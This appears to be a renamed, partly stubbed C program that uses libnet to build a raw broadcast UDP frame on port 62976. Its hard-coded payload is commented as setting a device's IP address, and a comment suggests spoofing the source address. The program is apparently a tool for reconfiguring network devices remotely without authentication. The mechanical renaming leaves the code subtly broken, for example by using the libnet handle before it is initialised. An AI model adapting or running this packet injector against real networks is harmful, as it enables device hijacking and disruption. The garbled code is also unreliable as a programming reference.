#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int u_short ;
typedef  int /*<<< orphan*/  u_long ;
typedef  int /*<<< orphan*/  u_int8_t ;
typedef  int /*<<< orphan*/  libnet_t ;
typedef  int libnet_ptag_t ;
typedef  char int8_t ;

/* Variables and functions */
 int /*<<< orphan*/  ETHERTYPE_IP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int /*<<< orphan*/  LIBNET_DONT_RESOLVE ; 
 int LIBNET_ERRBUF_SIZE ; 
 int LIBNET_IPV4_H ; 
 int /*<<< orphan*/  LIBNET_LINK ; 
 int /*<<< orphan*/  LIBNET_PR2 ; 
 int LIBNET_UDP_H ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int FUNC3 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 int FUNC4 (int,int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ *,int) ; 
 int FUNC5 (char*,int,int /*<<< orphan*/ *,int) ; 
 int FUNC6 (int,int,int,int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *) ; 
 char FUNC9 (int /*<<< orphan*/ ) ; 
 char* FUNC10 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC11 (char*,int*) ; 
 int /*<<< orphan*/ * FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ *,char*,int /*<<< orphan*/ ) ; 
 int FUNC14 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  stderr ; 
 int FUNC15 (char*) ; 

int FUNC16 (int argc, char *argv[]) {

	libnet_t *p;
	libnet_ptag_t ip, udp, ipoptions, ether;
	u_long srcip, dstip;
	u_short srcport = 62976, dstport = 62976, x;
	signed int ret;
	char errbuff[LIBNET_ERRBUF_SIZE], ipopt[21];
	int len;
	int8_t *macdst = "ff:ff:ff:ff:ff:ff";
	u_int8_t *macdest;
	char payload[128] = 	"\xfd\xfd\x00\x04\x00\x03\x00\x0f\x3d\x56\x97\x07"
				"\x0a\x00\x32\x32" /* ip address to set too */
				"\x00\x00\xff\xff\xff\x00\x00\x00\x00\x00";
	u_short payloadlen = FUNC15(payload);

	srcip = FUNC8(p); /* mod to spoof */
	dstip = FUNC13(p,"255.255.255.255",LIBNET_DONT_RESOLVE); /* 255.255.255.255 */
	udp = ip = ether = ipoptions = 0;

	if ( (macdest = FUNC11(macdst,&len)) == NULL) {
		FUNC1(stderr,"cant get mac str - %s",FUNC10(p));
		FUNC0 (1);
	}

	if ( (p = FUNC12 (LIBNET_LINK, NULL, errbuff)) == NULL) {
		FUNC1(stderr,"cant init() - %s\n",errbuff);
		FUNC0 (1);
	}

	if ( (udp = FUNC6(srcport,dstport,LIBNET_UDP_H + payloadlen,0,payload,payloadlen,p,udp)) == -1) {
		FUNC1(stderr,"cant build udp - %s\n",FUNC10(p));
		FUNC0 (1);
	}

	for (x=0;x<20;x++) {
		ipopt[x] = FUNC9(LIBNET_PR2);
	}

	ipoptions = FUNC5 (ipopt,20,p,ipoptions);

	if ( (ip = FUNC4 (LIBNET_IPV4_H + 20 + payloadlen + LIBNET_UDP_H,0,250,0,128,IPPROTO_UDP,
0,srcip,dstip,payload,payloadlen,p,ip)) == -1) {
		FUNC1(stderr,"cant build ipv4 - %s\n",FUNC10(p));
		FUNC0 (1);
	}

	if ((ether = FUNC3 (macdest,macdest,ETHERTYPE_IP,NULL,0,p,ether)) == -1) {
		FUNC1(stderr,"cant build ether - %s",FUNC10(p));
		FUNC0 (1);
	}

	//libnet_diag_dump_pblock(p);

	if ( (ret = FUNC14(p)) == -1) {
		FUNC1(stderr,"%s\n",FUNC10(p));
	}
	
	FUNC2(macdest); /* hex_aton malloc's - see libnet doco */
	FUNC7(p);

	return 0;
}